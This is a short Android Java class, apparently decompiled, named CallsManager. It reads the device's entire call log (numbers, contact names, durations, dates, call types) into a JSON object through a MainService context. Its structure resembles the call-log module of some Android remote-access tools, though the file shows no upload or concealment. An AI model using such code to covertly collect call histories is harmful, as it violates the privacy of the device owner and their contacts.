package com.example.project20;

import android.database.Cursor;
import android.net.Uri;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class CallsManager {
    public static JSONObject getCallsLogs() {
        try {
            JSONObject jSONObject = new JSONObject();
            JSONArray jSONArray = new JSONArray();
            Cursor query = MainService.getContextOfApplication().getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, null);
            while (query.moveToNext()) {
                JSONObject jSONObject2 = new JSONObject();
                String string = query.getString(query.getColumnIndex("number"));
                String string2 = query.getString(query.getColumnIndex("name"));
                String string3 = query.getString(query.getColumnIndex("duration"));
                String string4 = query.getString(query.getColumnIndex("date"));
                int parseInt = Integer.parseInt(query.getString(query.getColumnIndex("type")));
                jSONObject2.put("phoneNo", string);
                jSONObject2.put("name", string2);
                jSONObject2.put("duration", string3);
                jSONObject2.put("date", string4);
                jSONObject2.put("type", parseInt);
                jSONArray.put(jSONObject2);
            }
            jSONObject.put("callsList", jSONArray);
            return jSONObject;
        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
    }
}
